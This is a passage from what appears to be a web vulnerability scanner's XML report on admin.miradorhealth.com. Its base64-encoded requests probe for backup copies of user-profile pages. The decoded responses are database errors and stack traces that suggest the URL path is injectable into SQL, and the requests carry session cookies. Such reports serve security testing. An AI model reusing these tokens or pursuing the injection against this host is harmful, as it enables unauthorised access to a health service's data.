      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvbHpuJTIwKGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToxOSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzEyDQpTZXQtQ29va2llOiBBV1NBTEI9R0xLZE9YMkp5TWZQNU5yNkN1QzN4cTBJNkZMU2VaZENJeU9LRG4zZ094QXNkUklXNmszRit0TEJEWmhxTWhFalhVY2FIdFJiSXhpWjBMZW8rOGhOOUkxOUxWMUM1dlFiMFJ0NDNkeUpjOWVlWHZGT3pQTXFOV0VjdFlqbTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjE5IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUdMS2RPWDJKeU1mUDVOcjZDdUMzeHEwSTZGTFNlWmRDSXlPS0RuM2dPeEFzZFJJVzZrM0YrdExCRFpocU1oRWpYVWNhSHRSYkl4aVowTGVvKzhoTjlJMTlMVjFDNXZRYjBSdDQzZHlKYzllZVh2Rk96UE1xTldFY3RZam07IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToxOSBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogRlVOQ1RJT04gbWlyYWRvcl9pbnNpZ2h0cy5sem4gZG9lcyBub3QgZXhpc3QgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUICogZnJvbSB1Li4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVXNlci5waHAoMTk0KTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlclByb2ZpbGVDb250cm9sbGVyLnBocCg5Nik6IFVzZXI6OmdldCgnbHpuIChjb3B5KScpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnbHpuIChjb3B5KScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7953178288443721728</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20(another%20copy)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwKGFub3RoZXIlMjBjb3B5KSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyMiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQ0DQpTZXQtQ29va2llOiBBV1NBTEI9R0szZnExb2NIdXRIYUdEN09pdFpwNkI1REgxdElEZjVGMUtJek4vamNQejlFUFRKVnFCb0JBZHVqbnAycDkzZElxSVJVREw1QU1VRk9HblgvUGNyQURKOTdUNUxnZXM0dmU5ajJ4Nmk4MFEybjZKSzMzWTNjVlVzUnhzWTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjIyIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUdLM2ZxMW9jSHV0SGFHRDdPaXRacDZCNURIMXRJRGY1RjFLSXpOL2pjUHo5RVBUSlZxQm9CQWR1am5wMnA5M2RJcUlSVURMNUFNVUZPR25YL1BjckFESjk3VDVMZ2VzNHZlOWoyeDZpODBRMm42SkszM1kzY1ZVc1J4c1k7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyMiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnKGFub3RoZXIgY29weSknIGF0IGxpbmUgMSBpbiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDoyNApTdGFjayB0cmFjZToKIzAgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHAoMjQpOiBteXNxbGktJmd0O3F1ZXJ5KCdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMSAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL21vZGVscy9Vc2VyLnBocCgxOTQpOiBEYlV0aWw6OmdldFNlbGVjdFJlc3VsdChPYmplY3QobXlzcWxpKSwgJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMyIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vY29udHJvbGxlci9Vc2VyUHJvZmlsZUNvbnRyb2xsZXIucGhwKDk2KTogVXNlcjo6Z2V0KCczOTkgKGFub3RoZXIgY28uLi4nKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJzM5OSAoYW5vdGhlciBjby4uLicsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvYmF0JTIwKGFub3RoZXIlMjBjb3B5KSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyMiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzQxDQpTZXQtQ29va2llOiBBV1NBTEI9YzhxMEpoYTVhZk8zU1VLc0w3dDAzMHBrd0pQcFRGbk1FVVAveG8wTXVjNFJCN3hIYzlibFNWQzd4UnU0cS90QkFVckdRMjViK0ZrZ3dmWUtkd21CcDJmemtCbHBXSWpnWUZKOHpyWXJJY1pBRU03OGFRZHVxSkI3N2FxMzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjIyIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWM4cTBKaGE1YWZPM1NVS3NMN3QwMzBwa3dKUHBURm5NRVVQL3hvME11YzRSQjd4SGM5YmxTVkM3eFJ1NHEvdEJBVXJHUTI1YitGa2d3ZllLZHdtQnAyZnprQmxwV0lqZ1lGSjh6cllySWNaQUVNNzhhUWR1cUpCNzdhcTM7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyMiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogSW5jb3JyZWN0IHBhcmFtZXRlcnMgaW4gdGhlIGNhbGwgdG8gc3RvcmVkIGZ1bmN0aW9uIGBiYXRgIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ2JhdCAoYW5vdGhlciBjby4uLicpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnYmF0IChhbm90aGVyIGNvLi4uJywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8358085979629537280</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20(third%20copy)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwKHRoaXJkJTIwY29weSkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgc2NyZWVuV2lkdGg9MTM2ODsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVg7IEFXU0FMQkNPUlM9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQyDQpTZXQtQ29va2llOiBBV1NBTEI9Mk13aW4ramd4Z3FmaGM4Z0tDV0xmSE00K1kvbGZJVFVNeDc3NG5hMGpKSUYxeEVKdEZnNTFJQThjRHExQ2tuMGJmRzhYeHNOQjlFVHRzZFVFZnVrZDI5NGl4bEo4RVd4K25KVXphRlF0ZytodEhvN0lDdS9xSHhvWE9JZzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjIzIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPTJNd2luK2pneGdxZmhjOGdLQ1dMZkhNNCtZL2xmSVRVTXg3NzRuYTBqSklGMXhFSnRGZzUxSUE4Y0RxMUNrbjBiZkc4WHhzTkI5RVR0c2RVRWZ1a2QyOTRpeGxKOEVXeCtuSlV6YUZRdGcraHRIbzdJQ3UvcUh4b1hPSWc7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyMyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBN